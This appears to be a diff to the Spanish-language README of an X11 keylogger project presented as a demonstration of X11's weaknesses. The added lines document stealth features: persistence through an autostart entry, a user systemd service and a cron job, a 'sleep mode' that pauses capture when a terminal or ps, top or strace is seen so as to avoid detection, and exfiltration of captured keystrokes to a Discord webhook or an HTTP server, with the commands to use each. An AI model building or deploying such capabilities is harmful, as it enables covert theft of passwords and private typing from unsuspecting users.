@@ -43,6 +43,9 @@ Este proyecto demuestra cómo X11, diseñado en 1984, presenta carencias fundame
 - ✅ Conversión de keycodes a strings legibles
 - ✅ Salida en archivo y consola
 - ✅ Manejo de señales para limpieza segura
+- ✅ **Persistencia automática**: Desktop Entry + Systemd
+- ✅ **Sleep Mode inteligente**: Detecta terminales/auditoría y pausa captura
+- ✅ Exfiltración a Discord/HTTP opcional
 - ✅ Código comentado y documentado
 - ✅ Sin dependencias externas complejas
 
@@ -82,12 +85,72 @@ make help
 
 ## 📖 Uso
 
+### Opciones Básicas
+
 ```bash
-# Ejecutar el keylogger
+# Ejecutar como daemon (defecto)
 ./x11_keylogger
+
+# Ejecutar en foreground (no daemonizar)
+./x11_keylogger -d
+
+# Modo silencioso (sin output a consola)
+./x11_keylogger -q
+
+# Ver todas las opciones
+./x11_keylogger -h
 ```
 
-El programa:
+### Persistencia (Opcional)
+
+Para que el keylogger se ejecute automáticamente tras reinicio:
+
+```bash
+# Instalar persistencia
+./x11_keylogger --install-persist
+
+# Esto instala:
+# ✓ Desktop entry en ~/.config/autostart/
+# ✓ Systemd service en ~/.config/systemd/user/
+# ✓ Cron job (monitor)
+
+# El proceso se ejecutará automáticamente en los siguientes casos:
+# - Reinicio del sistema
+# - Cierre y nueva apertura de sesión X11
+# - Cada 5 minutos (cron)
+```
+
+### Exfiltración a Discord
+
+```bash
+# Con Discord webhook desde .env
+export DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/..."
+make clean && make
+
+# O directamente
+./x11_keylogger --discord-webhook "https://discord.com/api/webhooks/..."
+
+# O modo HTTP
+./x11_keylogger -e -s 192.168.1.100 -P 8080
+```
+
+---
+
+## 🛌 Sleep Mode Inteligente
+
+El keylogger incluye detección de actividad sospechosa:
+
+- **Detecta**: Terminal abierta, comandos como `ps`, `top`, `strace`
+- **Acción**: Pausa la captura automáticamente
+- **Reinicia**: Cuando desaparece la amenaza (+ 60s de seguridad)
+
+**Beneficio**: Evita ser detectado si el usuario ejecuta comandos de auditoría.
+
+---
+
+## 📖 Uso Anterior
+
+El programa originalmente:
 
 1. Mostrará advertencias legales
 2. Solicitará confirmación (escribir 's' para continuar)
